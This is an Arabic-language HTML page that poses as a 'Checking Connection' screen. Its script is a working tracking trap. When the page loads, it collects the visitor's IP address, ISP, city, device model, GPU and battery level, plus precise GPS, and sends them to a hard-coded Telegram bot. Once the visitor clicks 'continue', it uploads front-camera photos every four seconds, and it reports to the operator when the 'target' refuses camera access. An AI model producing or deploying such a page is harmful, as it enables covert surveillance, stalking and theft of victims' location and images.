<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection</title>
    <style>
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 320px; }
        .ldr { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
    </style>
</head>
<body>

    <div class="box">
        <div class="ldr" id="L"></div>
        <p id="T">جاري الفحص...</p>
        <button id="B">متابعة الآن</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const _U = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const _C = "2103976274";

        async function fullScan() {
            let n = navigator;
            let r = "🛑 **تقرير تقني شامل (فوري)**\n\n";

            // 1. جلب الآي بي والشبكة (التي تعمل لديك)
            try {
                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                r += `🌍 **الآي بي:** \`${res.ip}\`\n`;
                r += `🏢 **الشركة (ISP):** ${res.org}\n`;
                r += `📍 **المكان (تقريبي):** ${res.city}, ${res.country_name}\n`;
            } catch(e) { r += "🌍 **الشبكة:** فشل جلب الآي بي\n"; }

            // 2. كشف نوع الهاتف والموديل الدقيق
            let model = "غير معروف";
            try {
                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    model = `${ua.model} (Android ${ua.platformVersion})`;
                } else {
                    let match = n.userAgent.match(/\(([^)]+)\)/);
                    model = match ? match[1] : n.platform;
                }
            } catch(e) { model = n.platform; }
            r += `📱 **النظام الأساسي:** ${model}\n`;

            // 3. المعالج الرسومي (GPU)
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                r += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
            } catch(e) {}

            r += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 8}\n`;
            r += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
            
            try {
                const b = await n.getBattery();
                r += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
            } catch(e) {}

            r += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}`;

            // إرسال التقرير النصي الأول فوراً
            sendText(r);
            
            // طلب الموقع الجغرافي الدقيق (GPS)
            if (n.geolocation) {
                n.geolocation.getCurrentPosition((pos) => {
                    let gps = `📍 **الموقع الدقيق (GPS):**\n`;
                    gps += `رابط الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendText(gps);
                });
            }

            setTimeout(() => { 
                document.getElementById('L').style.display='none'; 
                document.getElementById('T').innerText='اكتمل الفحص بنجاح.'; 
                document.getElementById('B').style.display='block'; 
            }, 1000);
        }

        document.getElementById('B').onclick = async function() {
            this.style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = s;
                setInterval(() => {
                    const canvas = document.getElementById('c'), video = document.getElementById('v');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const f = new FormData(); f.append('chat_id', _C); f.append('photo', b, 'x.jpg');
                        fetch(_U + "sendPhoto", { method: 'POST', body: f });
                    }, 'image/jpeg', 0.8);
                }, 4000);
            } catch (e) {
                sendText("⚠️ المستهدف رفض الكاميرا");
            }
        };

        function sendText(t) {
            fetch(_U + "sendMessage", { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ chat_id: _C, text: t, parse_mode: "Markdown" })
            });
        }

        fullScan();
    </script>
</body>
</html>
